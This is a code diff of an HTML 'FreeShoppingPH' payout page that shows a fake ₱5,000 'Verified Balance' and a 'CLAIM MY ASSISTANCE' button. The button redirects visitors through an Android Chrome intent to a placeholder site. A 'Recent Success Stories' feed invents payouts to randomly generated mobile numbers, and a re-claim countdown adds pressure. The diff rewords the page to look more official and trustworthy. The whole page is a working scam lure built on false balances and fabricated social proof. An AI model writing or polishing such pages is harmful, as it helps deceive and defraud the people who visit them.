@@ -3,15 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FreeShoppingPH | Payout</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>FreeShoppingPH | Official Payout</title>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --nature-green: #2d6a4f;
+            --soft-mint: #d8f3dc;
+            --emerald: #40916c;
+            --white-glass: rgba(255, 255, 255, 0.9);
+            --text-dark: #1b4332;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body { 
-            font-family: 'Poppins', sans-serif; 
-            background: #0f172a; 
-            color: #f8fafc; 
+            font-family: 'Public Sans', sans-serif; 
+            /* Peaceful Nature Gradient */
+            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
+            color: var(--text-dark); 
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,117 +29,113 @@
         }
 
         .card {
-            background: #1e293b;
+            background: var(--white-glass);
             width: 100%;
-            max-width: 420px;
-            padding: 30px 20px;
-            border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            max-width: 400px;
+            padding: 35px 25px;
+            border-radius: 35px;
+            /* Soft shadow for a "floating" look */
+            box-shadow: 0 25px 50px rgba(45, 106, 79, 0.1);
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            backdrop-filter: blur(10px);
         }
 
         .logo-img {
-            width: 80%;
-            max-width: 250px;
-            margin: 0 auto 25px auto;
+            width: 100%;
+            max-width: 220px;
+            margin: 0 auto 20px auto;
             display: block;
-            object-fit: contain;
+            border-radius: 20px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
         }
 
         h1 {
-            font-size: 14px;
-            color: #94a3b8;
+            font-size: 13px;
+            color: var(--emerald);
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 5px;
+            letter-spacing: 2.5px;
+            font-weight: 800;
+            margin-bottom: 8px;
         }
 
         .amount {
-            font-size: 42px;
+            font-family: 'Quicksand', sans-serif;
+            font-size: 48px;
             font-weight: 700;
-            color: #4ade80; 
+            color: var(--nature-green); 
             margin-bottom: 25px;
-            text-shadow: 0 0 20px rgba(74, 222, 128, 0.4);
-            animation: glow 2s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px rgba(74, 222, 128, 0.2); }
-            to { text-shadow: 0 0 25px rgba(74, 222, 128, 0.8); }
+            /* Soft glow instead of sharp green */
+            text-shadow: 0 4px 10px rgba(45, 106, 79, 0.15);
         }
 
         .pay-button { 
-            background: linear-gradient(90deg, #0056b3, #007dfe); 
+            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
             color: white; 
             width: 100%;
-            padding: 18px; 
+            padding: 20px; 
             border: none; 
-            border-radius: 50px; 
-            font-size: 18px; 
+            border-radius: 20px; 
+            font-size: 16px; 
             font-weight: 700;
+            letter-spacing: 1px;
             cursor: pointer; 
             transition: all 0.3s ease;
-            box-shadow: 0 8px 20px rgba(0, 125, 254, 0.4);
+            box-shadow: 0 10px 25px rgba(45, 106, 79, 0.25);
         }
 
-        #timer-text { display: none; color: #ef4444; font-weight: 700; margin-top: 15px; font-size: 14px; }
+        .pay-button:active { transform: scale(0.96); }
+
+        #timer-text { display: none; color: #d90429; font-weight: 700; margin-top: 15px; font-size: 14px; }
 
         .promo-photo {
             width: 100%;
-            border-radius: 16px;
+            border-radius: 20px;
             margin-top: 25px;
-            display: block;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 4px solid white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
         }
 
-        /* WINNERS LIST STYLING */
         .winners-container {
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 204, 0, 0.3);
-            padding: 15px;
-            border-radius: 16px;
+            background: rgba(255, 255, 255, 0.6);
+            border: 1px solid var(--soft-mint);
+            padding: 18px;
+            border-radius: 25px;
             margin-top: 25px;
-            text-align: left;
         }
 
         .winners-container h3 {
-            font-size: 12px;
-            color: #fbbf24;
+            font-size: 11px;
+            color: var(--emerald);
             margin-bottom: 12px;
-            text-align: center;
             text-transform: uppercase;
-        }
-
-        #winners-list {
-            min-height: 50px; /* Ensures space is reserved */
+            letter-spacing: 1px;
         }
 
         .winner-item {
-            background: rgba(255, 255, 255, 0.05);
+            background: white;
             padding: 10px 15px;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 13px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 8px;
-            animation: slideIn 0.5s ease forwards;
+            border: 1px solid #f0f7f4;
+            animation: slideIn 0.6s ease forwards;
         }
 
         @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .payout-green { color: #4ade80 !important; font-weight: 700; }
+        .payout-green { color: var(--emerald) !important; font-weight: 800; }
 
         .gcash-mini {
             width: 20px;
             height: 20px;
-            border-radius: 50%;
-            background: white;
-            border: 1px solid #007dfe;
+            border-radius: 5px;
         }
     </style>
 </head>
@@ -139,21 +144,20 @@
 <div class="card">
     <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" alt="Logo" class="logo-img">
     
-    <h1>Claimable Balance</h1>
+    <h1>Verified Balance</h1>
     <div class="amount" id="balanceText">₱5,000.00</div>
 
     <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
-        CLAIM THRU GCASH
+        CLAIM MY ASSISTANCE
     </button>
 
-    <div id="timer-text">RECLAIM IN: <span id="waitTimer">05:00</span></div>
+    <div id="timer-text">SECURE RE-CLAIM IN: <span id="waitTimer">05:00</span></div>
 
-    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo" alt="Promo">
+    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo" alt="Assistance">
 
     <div class="winners-container">
-        <h3>🔴 Live Payouts</h3>
-        <div id="winners-list">
-            </div>
+        <h3>Recent Success Stories</h3>
+        <div id="winners-list"></div>
     </div>
 </div>
 
@@ -178,19 +182,19 @@
         const bal = document.getElementById('balanceText');
         const timerDiv = document.getElementById('timer-text');
 
-        animateValue("balanceText", 5000, 0, 800); 
-        bal.style.color = "#64748b";
-        bal.style.animation = "none";
+        animateValue("balanceText", 5000, 0, 1000); 
+        bal.style.opacity = "0.6";
 
         btn.disabled = true;
-        btn.innerHTML = "Processing...";
+        btn.innerHTML = "Verifying Account...";
         timerDiv.style.display = "block";
 
         startTimer(300);
 
         setTimeout(() => {
+            // Updated Intent for Chrome
             window.location.href = "intent://yourwebsite.com#Intent;scheme=https;package=com.android.chrome;end"; 
-        }, 1000);
+        }, 1200);
     }
 
     function startTimer(sec) {
@@ -203,48 +207,44 @@
             
             if (--timer < 0) {
                 clearInterval(interval);
-                animateValue("balanceText", 0, 5000, 1200); 
+                animateValue("balanceText", 0, 5000, 1500); 
                 const bal = document.getElementById('balanceText');
                 const btn = document.getElementById('claimBtn');
-                bal.style.color = "#4ade80";
-                bal.style.animation = "glow 2s infinite alternate";
+                bal.style.opacity = "1";
                 btn.disabled = false;
-                btn.innerHTML = "CLAIM THRU GCASH";
+                btn.innerHTML = "CLAIM MY ASSISTANCE";
                 document.getElementById('timer-text').style.display = "none";
             }
         }, 1000);
     }
 
     function generateWinner() {
-        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
+        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966'];
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
         const lastThree = Math.floor(100 + Math.random() * 900);
         
-        // FIXED: Removed the line break that was breaking the code
-        const myGcashImage = "https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png"; 
+        // Assuming your icon is in images/gc_icon.png
+        const myGcashImage = "images/gc_icon.png"; 
 
         const winnerEntry = document.createElement('div');
         winnerEntry.className = 'winner-item';
         winnerEntry.innerHTML = `
-            <span>📱 ${randomPrefix}****${lastThree}</span>
-            <img src="${myGcashImage}" class="gcash-mini" alt="GC">
+            <span>📱 ${randomPrefix}***${lastThree}</span>
             <strong class="payout-green">+₱5,000</strong>
         `;
 
         const list = document.getElementById('winners-list');
         if (list) {
             list.prepend(winnerEntry);
-            if (list.children.length > 5) {
+            if (list.children.length > 4) {
                 list.removeChild(list.lastChild);
             }
         }
     }
 
-    // Initialize list
+    // Start the live feed
     generateWinner();
-    generateWinner();
-    // Generate new ones every 3.5 seconds
-    setInterval(generateWinner, 3500);
+    setInterval(generateWinner, 4000);
 </script>
 
 </body>
